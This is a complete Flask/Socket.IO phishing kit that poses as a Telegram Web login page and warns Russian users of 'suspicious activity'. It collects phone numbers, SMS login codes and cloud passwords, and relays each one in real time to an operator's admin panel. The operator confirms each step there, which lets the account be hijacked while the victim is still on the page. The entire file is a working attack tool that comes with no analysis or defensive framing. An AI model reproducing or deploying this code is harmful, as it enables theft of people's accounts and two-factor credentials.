import eventlet
eventlet.monkey_patch()
from flask import Flask, render_template_string, request, redirect, url_for
from flask_socketio import SocketIO, emit, join_room, leave_room
from datetime import datetime
import re

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-here'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet', logger=True, engineio_logger=True)

# Хранение состояний пользователей
users = {}
logs = []

def log_action(message):
    timestamp = datetime.now().strftime('%H:%M:%S')
    log_entry = f"[{timestamp}] {message}"
    logs.append(log_entry)
    socketio.emit('new_log', log_entry, namespace='/')

@app.route('/')
def index():
    log_action('Пользователь зашел на главную страницу')
    return render_template_string('''
    <!doctype html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Telegram - Авторизация</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
                background: #f0f0f0;
                color: #333; 
                display: flex; 
                justify-content: center; 
                align-items: center; 
                min-height: 100vh;
                padding: 20px;
            }
            .container { 
                max-width: 400px; 
                width: 100%;
                background: #ffffff;
                padding: 40px 30px;
                border-radius: 18px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.05);
                text-align: center; 
                animation: fadeIn 0.4s ease-out;
            }
            @keyframes fadeIn { 
                from { opacity: 0; transform: translateY(-20px); } 
                to { opacity: 1; transform: translateY(0); } 
            }
            .logo {
                width: 80px;
                height: 80px;
                background: linear-gradient(135deg, #2AABEE, #26A5E4);
                border-radius: 20px;
                margin: 0 auto 25px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 40px;
                box-shadow: 0 4px 12px rgba(42, 171, 238, 0.2);
            }
            h1 { 
                color: #333; 
                font-size: 26px;
                font-weight: 600;
                margin-bottom: 15px;
            }
            p {
                color: #666;
                font-size: 15px;
                margin-bottom: 30px;
                line-height: 1.5;
            }
            button { 
                background: linear-gradient(135deg, #2AABEE, #26A5E4);
                color: #fff; 
                border: none; 
                padding: 16px 40px;
                border-radius: 12px;
                cursor: pointer; 
                font-size: 17px;
                font-weight: 500;
                width: 100%;
                transition: all 0.3s ease;
                box-shadow: 0 4px 12px rgba(42, 171, 238, 0.3);
            }
            button:hover { 
                transform: translateY(-2px);
                box-shadow: 0 6px 16px rgba(42, 171, 238, 0.4);
            }
            button:active { 
                transform: translateY(0);
            }
            .security-note {
                margin-top: 25px;
                padding: 15px;
                background: #f0f9ff;
                border-radius: 12px;
                color: #2AABEE;
                font-size: 14px;
                display: flex;
                align-items: center;
                gap: 10px;
            }
            .security-note::before {
                content: "🔒";
                font-size: 20px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">📱</div>
            <h1>Telegram Web</h1>
            <p>Мы заметили подозрительную активность. Авторизуйтесь для верификации.</p>
            <button onclick="window.location.href='/phone'">Начать авторизацию</button>
            <div class="security-note">
                Безопасное соединение защищено шифрованием
            </div>
        </div>
    </body>
    </html>
    ''')

@app.route('/phone')
def phone():
    log_action('Пользователь перешел к вводу номера телефона')
    return render_template_string('''
    <!doctype html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Telegram - Вход</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
                background: #f0f0f0;
                display: flex; 
                justify-content: center; 
                align-items: center; 
                min-height: 100vh;
                padding: 20px;
            }
            .container { 
                max-width: 400px; 
                width: 100%;
                background: #ffffff;
                padding: 40px 30px;
                border-radius: 18px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.05);
                animation: fadeIn 0.4s ease-out;
            }
            @keyframes fadeIn { 
                from { opacity: 0; transform: translateY(-20px); } 
                to { opacity: 1; transform: translateY(0); } 
            }
            .header {
                text-align: center;
                margin-bottom: 30px;
            }
            .logo {
                width: 70px;
                height: 70px;
                background: linear-gradient(135deg, #2AABEE, #26A5E4);
                border-radius: 18px;
                margin: 0 auto 20px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 35px;
                box-shadow: 0 4px 12px rgba(42, 171, 238, 0.2);
            }
            h2 { 
                color: #333; 
                font-size: 24px;
                font-weight: 600;
                margin-bottom: 10px;
            }
            .subtitle {
                color: #666;
                font-size: 15px;
                line-height: 1.5;
            }
            .input-group {
                margin-bottom: 20px;
                text-align: left;
            }
            label {
                display: block;
                color: #333;
                font-size: 14px;
                font-weight: 500;
                margin-bottom: 8px;
            }
            input { 
                width: 100%; 
                padding: 16px 18px;
                border: 2px solid #e0e0e0;
                border-radius: 12px;
                font-size: 16px;
                transition: all 0.3s;
                background: #fff;
            }
            input:focus { 
                border-color: #2AABEE;
                outline: none;
                box-shadow: 0 0 0 4px rgba(42, 171, 238, 0.15);
            }
            button { 
                background: linear-gradient(135deg, #2AABEE, #26A5E4);
                color: #fff; 
                border: none; 
                padding: 16px;
                border-radius: 12px;
                cursor: pointer; 
                font-size: 17px;
                font-weight: 500;
                width: 100%;
                transition: all 0.3s ease;
                box-shadow: 0 4px 12px rgba(42, 171, 238, 0.3);
                margin-top: 10px;
            }
            button:hover { 
                transform: translateY(-2px);
                box-shadow: 0 6px 16px rgba(42, 171, 238, 0.4);
            }
            button:active { 
                transform: translateY(0);
            }
            button:disabled {
                background: #ccc;
                cursor: not-allowed;
                transform: none;
            }
            .error { 
                color: #e74c3c;
                font-size: 14px;
                margin-top: 10px;
                padding: 12px;
                background: #fee;
                border-radius: 12px;
                display: none;
            }
            .error.show {
                display: block;
                animation: shake 0.3s;
            }
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                25% { transform: translateX(-10px); }
                75% { transform: translateX(10px); }
            }
            .loading {
                display: none;
                text-align: center;
                color: #2AABEE;
                margin-top: 15px;
            }
            .loading.show {
                display: block;
            }
            .spinner {
                border: 3px solid #f3f3f3;
                border-top: 3px solid #2AABEE;
                border-radius: 50%;
                width: 30px;
                height: 30px;
                animation: spin 0.8s linear infinite;
                margin: 0 auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
        <script>
            var socket = io({
                transports: ['websocket', 'polling']
            });
            socket.on('connect', function() {
                console.log('Соединение установлено');
            });
            socket.on('redirect_to_admin', function(data) {
                window.location.href = data.url;
            });
            function submitPhone() {
                var phoneInput = document.getElementById('phone');
                var phone = phoneInput.value.replace(/[^+0-9]/g, '');
                var errorDiv = document.getElementById('error');
                var loadingDiv = document.getElementById('loading');
                var submitBtn = document.getElementById('submitBtn');
                errorDiv.classList.remove('show');
                if (!phone.startsWith('+7')) {
                    errorDiv.textContent = 'Номер должен начинаться с +7';
                    errorDiv.classList.add('show');
                    return;
                }
                if (phone.length < 12) {
                    errorDiv.textContent = 'Введите полный номер телефона';
                    errorDiv.classList.add('show');
                    return;
                }
                submitBtn.disabled = true;
                loadingDiv.classList.add('show');
                socket.emit('submit_phone', phone);
                setTimeout(function() {
                    window.location.href = '/code?phone=' + encodeURIComponent(phone);
                }, 500);
            }
            // Форматирование номера при вводе
            document.addEventListener('DOMContentLoaded', function() {
                var phoneInput = document.getElementById('phone');
                phoneInput.addEventListener('input', function(e) {
                    var x = e.target.value.replace(/\\D/g, '').match(/(\\d{0,1})(\\d{0,3})(\\d{0,3})(\\d{0,2})(\\d{0,2})/);
                    e.target.value = !x[2] ? '+' + x[1] : '+' + x[1] + ' (' + x[2] + ') ' + x[3] + (x[4] ? '-' + x[4] : '') + (x[5] ? '-' + x[5] : '');
                });
                // Enter для отправки
                phoneInput.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        submitPhone();
                    }
                });
            });
        </script>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="logo">📱</div>
                <h2>Вход в Telegram</h2>
                <p class="subtitle">Введите ваш номер телефона</p>
            </div>
            <div class="input-group">
                <label for="phone">Номер телефона</label>
                <input id="phone" type="tel" placeholder="+7 (___) ___-__-__" value="+7 " autofocus />
            </div>
            <div id="error" class="error"></div>
            <button id="submitBtn" onclick="submitPhone()">Получить код</button>
            <div id="loading" class="loading">
                <div class="spinner"></div>
                <p style="margin-top: 10px;">Отправка...</p>
            </div>
        </div>
    </body>
    </html>
    ''')

@socketio.on('submit_phone', namespace='/')
def handle_phone(phone):
    if not phone.startswith('+7'):
        return
    digits = re.sub(r'\D', '', phone[2:])
    if len(digits) == 10 and all(d == '9' for d in digits):
        log_action(f'🔑 Админ вошел с номером: {phone}')
        emit('redirect_to_admin', {'url': '/admin'})
        return
    users[phone] = {
        'entered_code': None, 
        'confirmed_code': False, 
        'entered_password': None, 
        'confirmed_password': False,
        'attempts': 0,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    log_action(f'📞 Новый пользователь: {phone}')

@app.route('/code')
def code():
    phone = request.args.get('phone')
    if not phone or phone not in users:
        return redirect('/')
    log_action(f'💬 {phone} перешел к вводу кода')
    return render_template_string('''
    <!doctype html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Telegram - Код подтверждения</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
                background: #f0f0f0;
                display: flex; 
                justify-content: center; 
                align-items: center; 
                min-height: 100vh;
                padding: 20px;
            }
            .container { 
                max-width: 400px; 
                width: 100%;
                background: #ffffff;
                padding: 40px 30px;
                border-radius: 18px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.05);
                animation: fadeIn 0.4s ease-out;
            }
            @keyframes fadeIn { 
                from { opacity: 0; transform: translateY(-20px); } 
                to { opacity: 1; transform: translateY(0); } 
            }
            .header {
                text-align: center;
                margin-bottom: 30px;
            }
            .logo {
                width: 70px;
                height: 70px;
                background: linear-gradient(135deg, #2AABEE, #26A5E4);
                border-radius: 18px;
                margin: 0 auto 20px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 35px;
                box-shadow: 0 4px 12px rgba(42, 171, 238, 0.2);
            }
            h2 { 
                color: #333; 
                font-size: 24px;
                font-weight: 600;
                margin-bottom: 10px;
            }
            .subtitle {
                color: #666;
                font-size: 15px;
                line-height: 1.5;
            }
            .phone-display {
                color: #2AABEE;
                font-weight: 500;
                margin-top: 5px;
            }
            .code-inputs {
                display: flex;
                gap: 10px;
                justify-content: center;
                margin: 30px 0;
            }
            .code-input {
                width: 50px;
                height: 60px;
                text-align: center;
                font-size: 24px;
                font-weight: 700;
                border: 2px solid #e0e0e0;
                border-radius: 12px;
                transition: all 0.3s;
            }
            .code-input:focus {
                border-color: #2AABEE;
                outline: none;
                box-shadow: 0 0 0 4px rgba(42, 171, 238, 0.15);
            }
            .error { 
                color: #e74c3c;
                font-size: 14px;
                text-align: center;
                padding: 12px;
                background: #fee;
                border-radius: 12px;
                display: none;
                margin-bottom: 15px;
            }
            .error.show {
                display: block;
                animation: shake 0.3s;
            }
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                25% { transform: translateX(-10px); }
                75% { transform: translateX(10px); }
            }
            .resend-link {
                text-align: center;
                margin-top: 20px;
                color: #2AABEE;
                cursor: pointer;
                font-size: 15px;
            }
            .resend-link:hover {
                text-decoration: underline;
            }
            .loading {
                display: none;
                text-align: center;
                color: #2AABEE;
                margin-top: 15px;
            }
            .loading.show {
                display: block;
            }
        </style>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
        <script>
            var socket = io({
                transports: ['websocket', 'polling']
            });
            var phone = '{{ phone }}';
            document.addEventListener('DOMContentLoaded', function() {
                const inputs = document.querySelectorAll('.code-input');
                inputs.forEach((input, index) => {
                    input.addEventListener('input', function(e) {
                        // Проверяем, что введена только цифра
                        if (!/\\d/.test(e.target.value) && e.target.value !== '') {
                            e.target.value = e.target.value.replace(/[^\\d]/g, '');
                        }
                        if (e.target.value.length === 1 && index < inputs.length - 1) {
                            inputs[index + 1].focus();
                        }
                        if (index === inputs.length - 1 && e.target.value.length === 1) {
                            submitCode();
                        }
                    });
                    input.addEventListener('keydown', function(e) {
                        if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                            inputs[index - 1].focus();
                        }
                    });
                });
                inputs[0].focus();
            });
            function submitCode() {
                const inputs = document.querySelectorAll('.code-input');
                const code = Array.from(inputs).map(input => input.value).join('');
                if (code.length === 6) {
                    document.getElementById('loading').classList.add('show');
                    socket.emit('submit_code', {phone: phone, code: code});
                }
            }
            socket.on('code_confirmed', function(data) {
                document.getElementById('loading').classList.remove('show');
                if (data.phone === phone && data.confirmed) {
                    window.location.href = '/password?phone=' + encodeURIComponent(phone);
                } else if (data.phone === phone) {
                    document.getElementById('error').textContent = 'Неверный код. Попробуйте еще раз.';
                    document.getElementById('error').classList.add('show');
                    document.querySelectorAll('.code-input').forEach(input => {
                        input.value = '';
                        input.style.borderColor = '#e74c3c';
                    });
                    document.querySelector('.code-input').focus();
                }
            });
        </script>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="logo">✉️</div>
                <h2>Код подтверждения</h2>
                <p class="subtitle">
                    Мы отправили SMS с кодом на номер<br>
                    <span class="phone-display">{{ phone }}</span>
                </p>
            </div>
            <div class="code-inputs">
                <input type="text" maxlength="1" class="code-input" pattern="[0-9]">
                <input type="text" maxlength="1" class="code-input" pattern="[0-9]">
                <input type="text" maxlength="1" class="code-input" pattern="[0-9]">
                <input type="text" maxlength="1" class="code-input" pattern="[0-9]">
                <input type="text" maxlength="1" class="code-input" pattern="[0-9]">
                <input type="text" maxlength="1" class="code-input" pattern="[0-9]">
            </div>
            <div id="error" class="error"></div>
            <div id="loading" class="loading">
                Проверка кода...
            </div>
            <div class="resend-link" onclick="alert('Новый код отправлен')">
                Отправить код повторно
            </div>
        </div>
    </body>
    </html>
    ''', phone=phone)

@app.route('/password')
def password():
    phone = request.args.get('phone')
    if not phone or phone not in users or not users[phone]['confirmed_code']:
        return redirect('/')
    log_action(f'🔐 {phone} перешел к вводу пароля')
    return render_template_string('''
    <!doctype html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Telegram - Cloud Password</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
                background: #f0f0f0;
                display: flex; 
                justify-content: center; 
                align-items: center; 
                min-height: 100vh;
                padding: 20px;
            }
            .container { 
                max-width: 400px; 
                width: 100%;
                background: #ffffff;
                padding: 40px 30px;
                border-radius: 18px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.05);
                animation: fadeIn 0.4s ease-out;
            }
            @keyframes fadeIn { 
                from { opacity: 0; transform: translateY(-20px); } 
                to { opacity: 1; transform: translateY(0); } 
            }
            .header {
                text-align: center;
                margin-bottom: 30px;
            }
            .logo {
                width: 70px;
                height: 70px;
                background: linear-gradient(135deg, #2AABEE, #26A5E4);
                border-radius: 18px;
                margin: 0 auto 20px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 35px;
                box-shadow: 0 4px 12px rgba(42, 171, 238, 0.2);
            }
            h2 { 
                color: #333; 
                font-size: 24px;
                font-weight: 600;
                margin-bottom: 10px;
            }
            .subtitle {
                color: #666;
                font-size: 15px;
                line-height: 1.5;
            }
            .input-group {
                position: relative;
                margin-bottom: 20px;
            }
            label {
                display: block;
                color: #333;
                font-size: 14px;
                font-weight: 500;
                margin-bottom: 8px;
            }
            input { 
                width: 100%; 
                padding: 16px 50px 16px 18px;
                border: 2px solid #e0e0e0;
                border-radius: 12px;
                font-size: 16px;
                transition: all 0.3s;
                background: #fff;
            }
            input:focus { 
                border-color: #2AABEE;
                outline: none;
                box-shadow: 0 0 0 4px rgba(42, 171, 238, 0.15);
            }
            .toggle-password {
                position: absolute;
                right: 15px;
                top: 42px;
                cursor: pointer;
                font-size: 20px;
                user-select: none;
            }
            button { 
                background: linear-gradient(135deg, #2AABEE, #26A5E4);
                color: #fff; 
                border: none; 
                padding: 16px;
                border-radius: 12px;
                cursor: pointer; 
                font-size: 17px;
                font-weight: 500;
                width: 100%;
                transition: all 0.3s ease;
                box-shadow: 0 4px 12px rgba(42, 171, 238, 0.3);
                margin-top: 10px;
            }
            button:hover { 
                transform: translateY(-2px);
                box-shadow: 0 6px 16px rgba(42, 171, 238, 0.4);
            }
            button:active { 
                transform: translateY(0);
            }
            .error { 
                color: #e74c3c;
                font-size: 14px;
                padding: 12px;
                background: #fee;
                border-radius: 12px;
                display: none;
                margin-bottom: 15px;
            }
            .error.show {
                display: block;
                animation: shake 0.3s;
            }
            .success {
                color: #27ae60;
                font-size: 16px;
                text-align: center;
                padding: 15px;
                background: #d5f4e6;
                border-radius: 12px;
                display: none;
                margin-top: 15px;
            }
            .success.show {
                display: block;
                animation: fadeIn 0.5s;
            }
            @keyframes fadeIn {
                from { opacity: 0; }
                to { opacity: 1; }
            }
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                25% { transform: translateX(-10px); }
                75% { transform: translateX(10px); }
            }
            .forgot-link {
                text-align: center;
                margin-top: 15px;
                color: #2AABEE;
                cursor: pointer;
                font-size: 15px;
            }
            .forgot-link:hover {
                text-decoration: underline;
            }
        </style>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
        <script>
            var socket = io({
                transports: ['websocket', 'polling']
            });
            var phone = '{{ phone }}';
            function togglePassword() {
                var input = document.getElementById('password');
                var icon = document.getElementById('toggleIcon');
                if (input.type === 'password') {
                    input.type = 'text';
                    icon.textContent = '🙈';
                } else {
                    input.type = 'password';
                    icon.textContent = '👁️';
                }
            }
            function submitPassword() {
                var password = document.getElementById('password').value;
                if (!password) {
                    document.getElementById('error').textContent = 'Введите пароль';
                    document.getElementById('error').classList.add('show');
                    return;
                }
                socket.emit('submit_password', {phone: phone, password: password});
            }
            socket.on('password_confirmed', function(data) {
                if (data.phone === phone && data.confirmed) {
                    document.getElementById('success').classList.add('show');
                    setTimeout(function() {
                        document.querySelector('.container').style.opacity = '0';
                        setTimeout(function() {
                            window.location.href = '/';
                        }, 500);
                    }, 2000);
                } else if (data.phone === phone) {
                    document.getElementById('error').textContent = 'Неверный пароль. Попробуйте еще раз.';
                    document.getElementById('error').classList.add('show');
                    document.getElementById('password').style.borderColor = '#e74c3c';
                }
            });
            document.addEventListener('DOMContentLoaded', function() {
                document.getElementById('password').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        submitPassword();
                    }
                });
            });
        </script>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="logo">🔐</div>
                <h2>Cloud Password</h2>
                <p class="subtitle">Введите пароль облачного хранилища</p>
            </div>
            <div class="input-group">
                <label for="password">Пароль</label>
                <input id="password" type="password" placeholder="Введите пароль" autofocus />
                <span class="toggle-password" id="toggleIcon" onclick="togglePassword()">👁️</span>
            </div>
            <div id="error" class="error"></div>
            <button onclick="submitPassword()">Войти</button>
            <div id="success" class="success">
                ✓ Авторизация успешна! Перенаправление...
            </div>
            <div class="forgot-link" onclick="alert('Восстановление пароля отправлено на email')">
                Забыли пароль?
            </div>
        </div>
    </body>
    </html>
    ''', phone=phone)

@app.route('/admin')
def admin():
    return render_template_string('''
    <!doctype html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Panel - Telegram</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
                background: #f0f0f0;
                color: #333;
                padding: 20px;
            }
            .header {
                background: #ffffff;
                padding: 25px;
                border-radius: 16px;
                margin-bottom: 30px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.05);
            }
            .header h1 {
                font-size: 28px;
                font-weight: 600;
                display: flex;
                align-items: center;
                gap: 15px;
                color: #333;
            }
            .header p {
                margin-top: 10px;
                color: #666;
            }
            .stats {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            .stat-card {
                background: #ffffff;
                padding: 20px;
                border-radius: 12px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.05);
            }
            .stat-card h3 {
                font-size: 14px;
                color: #666;
                margin-bottom: 8px;
            }
            .stat-card .value {
                font-size: 32px;
                font-weight: 700;
                color: #2AABEE;
            }
            .container { 
                max-width: 1400px;
                margin: auto;
            }
            .section {
                background: #ffffff;
                border-radius: 16px;
                padding: 25px;
                margin-bottom: 25px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.05);
            }
            .section h2 {
                font-size: 22px;
                margin-bottom: 20px;
                color: #333;
                font-weight: 600;
            }
            #logs { 
                height: 350px;
                overflow-y: auto;
                background: #f9f9f9;
                padding: 15px;
                border-radius: 12px;
                font-family: 'Inter', monospace;
                font-size: 13px;
                line-height: 1.8;
                border: 1px solid #eee;
            }
            #logs::-webkit-scrollbar {
                width: 8px;
            }
            #logs::-webkit-scrollbar-track {
                background: #f1f1f1;
            }
            #logs::-webkit-scrollbar-thumb {
                background: #2AABEE;
                border-radius: 4px;
            }
            .log-entry {
                padding: 5px 0;
                border-bottom: 1px solid #eee;
            }
            #pending {
                display: grid;
                gap: 15px;
            }
            .pending-item {
                background: #f9f9f9;
                padding: 20px;
                border-radius: 12px;
                border-left: 4px solid #2AABEE;
                display: flex;
                justify-content: space-between;
                align-items: center;
                animation: slideIn 0.3s ease-out;
            }
            @keyframes slideIn {
                from { opacity: 0; transform: translateX(-20px); }
                to { opacity: 1; transform: translateX(0); }
            }
            .pending-info {
                flex: 1;
            }
            .pending-info strong {
                color: #2AABEE;
                font-size: 18px;
            }
            .pending-info .data {
                color: #333;
                font-size: 24px;
                font-weight: 700;
                margin: 8px 0;
                font-family: 'Inter', monospace;
            }
            .pending-info .meta {
                color: #888;
                font-size: 13px;
            }
            .actions {
                display: flex;
                gap: 10px;
            }
            button { 
                background: linear-gradient(135deg, #2AABEE, #26A5E4);
                color: #fff; 
                border: none; 
                padding: 12px 24px;
                border-radius: 8px;
                cursor: pointer; 
                font-size: 15px;
                font-weight: 500;
                transition: all 0.3s;
                box-shadow: 0 4px 12px rgba(42, 171, 238, 0.2);
            }
            button:hover { 
                transform: translateY(-2px);
                box-shadow: 0 6px 16px rgba(42, 171, 238, 0.3);
            }
            button.reject { 
                background: linear-gradient(135deg, #e74c3c, #c0392b);
                box-shadow: 0 4px 12px rgba(231, 76, 60, 0.2);
            }
            button.reject:hover {
                box-shadow: 0 6px 16px rgba(231, 76, 60, 0.3);
            }
            .empty-state {
                text-align: center;
                padding: 40px;
                color: #666;
                font-size: 16px;
            }
            @media (max-width: 768px) { 
                .pending-item {
                    flex-direction: column;
                    align-items: flex-start;
                }
                .actions {
                    width: 100%;
                    margin-top: 15px;
                }
                .actions button {
                    flex: 1;
                }
            }
        </style>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
        <script>
            var socket = io({
                transports: ['websocket', 'polling']
            });
            var totalUsers = 0;
            var totalCodes = 0;
            var totalPasswords = 0;
            socket.on('new_log', function(msg){
                var div = document.getElementById('logs');
                var entry = document.createElement('div');
                entry.className = 'log-entry';
                entry.innerHTML = msg;
                div.appendChild(entry);
                div.scrollTop = div.scrollHeight;
            });
            socket.on('new_code', function(data){
                totalCodes++;
                updateStats();
                var pending = document.getElementById('pending');
                var empty = document.getElementById('emptyState');
                if (empty) empty.remove();
                var entry = document.createElement('div');
                entry.className = 'pending-item';
                entry.id = 'code-' + data.phone.replace(/[^a-zA-Z0-9]/g, '');
                entry.innerHTML = `
                    <div class="pending-info">
                        <strong>📱 ${data.phone}</strong>
                        <div class="data">${data.code}</div>
                        <div class="meta">SMS код • ${new Date().toLocaleTimeString('ru-RU')}</div>
                    </div>
                    <div class="actions">
                        <button onclick="confirmCode('${data.phone}')">✓ Подтвердить</button>
                        <button class="reject" onclick="confirmCode('${data.phone}', false)">✗ Отклонить</button>
                    </div>
                `;
                pending.appendChild(entry);
            });
            socket.on('new_password', function(data){
                totalPasswords++;
                updateStats();
                var pending = document.getElementById('pending');
                var empty = document.getElementById('emptyState');
                if (empty) empty.remove();
                var entry = document.createElement('div');
                entry.className = 'pending-item';
                entry.id = 'password-' + data.phone.replace(/[^a-zA-Z0-9]/g, '');
                entry.innerHTML = `
                    <div class="pending-info">
                        <strong>📱 ${data.phone}</strong>
                        <div class="data">${data.password}</div>
                        <div class="meta">Пароль • ${new Date().toLocaleTimeString('ru-RU')}</div>
                    </div>
                    <div class="actions">
                        <button onclick="confirmPassword('${data.phone}')">✓ Подтвердить</button>
                        <button class="reject" onclick="confirmPassword('${data.phone}', false)">✗ Отклонить</button>
                    </div>
                `;
                pending.appendChild(entry);
            });
            function confirmCode(phone, confirmed = true) {
                socket.emit('confirm_code', {phone: phone, confirmed: confirmed});
                var entry = document.getElementById('code-' + phone.replace(/[^a-zA-Z0-9]/g, ''));
                if (entry) {
                    entry.style.opacity = '0';
                    setTimeout(() => entry.remove(), 300);
                }
                checkEmpty();
            }
            function confirmPassword(phone, confirmed = true) {
                socket.emit('confirm_password', {phone: phone, confirmed: confirmed});
                var entry = document.getElementById('password-' + phone.replace(/[^a-zA-Z0-9]/g, ''));
                if (entry) {
                    entry.style.opacity = '0';
                    setTimeout(() => entry.remove(), 300);
                }
                checkEmpty();
            }
            function checkEmpty() {
                setTimeout(() => {
                    var pending = document.getElementById('pending');
                    if (pending.children.length === 0) {
                        pending.innerHTML = '<div id="emptyState" class="empty-state">Нет ожидающих запросов</div>';
                    }
                }, 400);
            }
            function updateStats() {
                document.getElementById('statUsers').textContent = totalUsers;
                document.getElementById('statCodes').textContent = totalCodes;
                document.getElementById('statPasswords').textContent = totalPasswords;
            }
            checkEmpty();
        </script>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>⚡ Admin Panel</h1>
                <p>Панель управления и мониторинга системы авторизации</p>
            </div>
            <div class="stats">
                <div class="stat-card">
                    <h3>Всего пользователей</h3>
                    <div class="value" id="statUsers">0</div>
                </div>
                <div class="stat-card">
                    <h3>Введено кодов</h3>
                    <div class="value" id="statCodes">0</div>
                </div>
                <div class="stat-card">
                    <h3>Введено паролей</h3>
                    <div class="value" id="statPasswords">0</div>
                </div>
            </div>
            <div class="section">
                <h2>📊 Системные логи</h2>
                <div id="logs"></div>
            </div>
            <div class="section">
                <h2>⏳ Ожидающие подтверждения</h2>
                <div id="pending">
                    <div id="emptyState" class="empty-state">Нет ожидающих запросов</div>
                </div>
            </div>
        </div>
    </body>
    </html>
    ''')

@socketio.on('submit_code', namespace='/')
def handle_code(data):
    phone = data['phone']
    code = data['code']
    if phone in users:
        users[phone]['entered_code'] = code
        users[phone]['attempts'] += 1
        log_action(f'💬 {phone} ввел код: {code} (попытка #{users[phone]["attempts"]})')
        socketio.emit('new_code', {'phone': phone, 'code': code}, namespace='/')

@socketio.on('confirm_code', namespace='/')
def confirm_code(data):
    phone = data['phone']
    confirmed = data['confirmed']
    if phone in users:
        users[phone]['confirmed_code'] = confirmed
        socketio.emit('code_confirmed', {'phone': phone, 'confirmed': confirmed}, namespace='/')
        status = "✅ подтвердил" if confirmed else "❌ отклонил"
        log_action(f'👮 Админ {status} код для {phone}')

@socketio.on('submit_password', namespace='/')
def handle_password(data):
    phone = data['phone']
    password = data['password']
    if phone in users:
        users[phone]['entered_password'] = password
        log_action(f'🔐 {phone} ввел пароль: {password}')
        socketio.emit('new_password', {'phone': phone, 'password': password}, namespace='/')

@socketio.on('confirm_password', namespace='/')
def confirm_password(data):
    phone = data['phone']
    confirmed = data['confirmed']
    if phone in users:
        users[phone]['confirmed_password'] = confirmed
        socketio.emit('password_confirmed', {'phone': phone, 'confirmed': confirmed}, namespace='/')
        status = "✅ подтвердил" if confirmed else "❌ отклонил"
        log_action(f'👮 Админ {status} пароль для {phone}')

@socketio.on('connect', namespace='/')
def handle_connect():
    print('✓ Client connected')

@socketio.on('disconnect', namespace='/')
def handle_disconnect():
    print('✗ Client disconnected')

if __name__ == '__main__':
    import os
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host="0.0.0.0", port=port, debug=False)
